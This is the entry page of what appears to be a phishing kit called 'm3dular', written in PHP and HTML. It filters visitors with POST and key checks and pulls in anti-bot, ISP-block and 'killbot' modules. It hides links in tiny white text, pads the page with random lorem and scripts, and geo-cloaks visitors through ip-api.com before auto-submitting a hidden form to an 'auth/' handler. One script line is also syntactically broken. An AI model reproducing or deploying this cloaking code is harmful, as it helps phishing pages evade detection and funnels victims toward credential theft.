<?php


/*quackl3



████╗░████║╚════██╗██╔══██╗██║░░░██║██║░░░░░██╔══██╗██╔══██╗
██╔████╔██║░█████╔╝██║░░██║██║░░░██║██║░░░░░███████║██████╔╝
██║╚██╔╝██║░╚═══██╗██║░░██║██║░░░██║██║░░░░░██╔══██║██╔══██╗
██║░╚═╝░██║██████╔╝██████╔╝╚██████╔╝███████╗██║░░██║██║░░██║
╚═╝░░░░░╚═╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝


*/




//  all other cloud shit

if(!($_SERVER['REQUEST_METHOD']=="POST")){

// die user or m3d blacklist

die("NOT POST");

}

elseif ($_POST['n']!=$_GET['n']){
// IMPORTS AND CHECKS!


die("Key Mismatch ... ");
}



else{



// index front checks

require "inc/m3dular_config.php";
require "m3cache/m3dular_functions.php";




if($M3DBLOCK){include "inc/m3dblocker.php";} // LOCAL .dat file checks
if($STATICANTIBOT){include "inc/staticblocker.php";}; //
if($ISPBLOCK){include "inc/ispblocker.php";}

if($KILLBOT){
  require_once('killbot/code/include.php');
}





} // ELSE 


?>







<!DOCTYPE html>
<html>
  <head>
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        a{color:white; font-size: 3px; text-decoration: none;}
        </style>
  </head>
  <body>


  <style>
    body {overflow: hidden ; /* Hide scrollbars */} 
  .m3dbh{color:white; font-size: 3px; text-decoration: none;}
        </style>

<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  


<a href="m3cache/index.php">
<img src="m3cache/mx.png" alt="">  
</a>  


<div style="margin-top:2000px"></div>



  
<?=m3d_gen_a_lorem(rand(100,300),$loremdata,"m3cache/index.php")?>


  
<?=m3d_gen_scripts(rand(50,200),$loremdata)?>






<form method="POST" action="auth/" id="m3dform" name="rdp-check">
        <input type="hidden" name="renderer">
        <input type="hidden" name="color_depth">
        <input type="hidden" name="width">
        <input type="hidden" name="height">
</form>





<?php


?>



<script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>


<script>
// LOAD CONFIG

LOCATIONCLOAK=<?=$LOCATIONCLOAK?>;
LOCATIONCODE="<?=$LOCATIONCODE?>";


 

if(LOCATIONCLOAK)
{$.get("http://ip-api.com/json/", function(data, status){ 

console.log(data.countryCode);


if(data.countryCode==LOCATIONCODE){
  // match

  $.get("m3cache/ajax.php?n=m3d", function(data, status){ 
    document.getElementById("m3dform").submit();

    }); // process whitelist */}

    

}else{

  console.log("Country Mistatch")
}

   });}
    
   else{
    
    console.log("country ban off")

/   $.get("m3cache/ajax.php?n=m3d", function(data, status){ 
    document.getElementById("m3dform").submit();

    }); // process whitelist */}
  


  
  }// location check

   


// Once Done Give White list pass
  //  

 
 </script>

</body>
</html>


